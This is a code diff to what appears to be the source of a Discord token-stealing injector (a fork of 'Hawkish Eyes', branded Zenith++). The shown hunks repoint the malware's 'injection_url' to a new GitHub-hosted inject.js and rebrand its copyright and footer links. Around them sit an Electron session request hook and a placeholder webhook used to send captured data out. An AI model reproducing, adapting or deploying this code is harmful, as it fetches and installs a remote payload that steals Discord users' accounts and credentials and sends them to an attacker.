@@ -19,7 +19,7 @@ var config = {
 
     creator: "%NAME_CREATOR%",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/Inplex-sys/Hawkish-Eyes/main/inject.js",
+    injection_url: "https://raw.githubusercontent.com/EMRE13333/ZenithCBRO/main/inject.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
@@ -79,7 +79,7 @@ const makeEmbed = async ({
             },
             
             footer: {
-                text: `©[${config.creator}] | https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook`
+                text: `©[${config.creator}] | https://github.com/EMRE13333/ZenithCBRO`
             },
 
         }]
@@ -629,7 +629,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Zenith++-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
+                    value: `[Zenith++-Team 2023 <:hwkish:1104091524758773822>](https://github.com/EMRE13333/ZenithCBRO)`,
                     inline: !0
                 }, {
                     name: "Zenith++ Files",
@@ -714,7 +714,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Zenith++-Team 2023 <:hwkish:1104091524758773822>](https://github.com/Inplex-sys/Hawkish-Eyes-NoDualHook)`,
+                        value: `[Zenith++-Team 2023 <:hwkish:1104091524758773822>](https://github.com/EMRE13333/ZenithCBRO)`,
                         inline: !0
                     }, {
                         name: "Zenith++ Files",
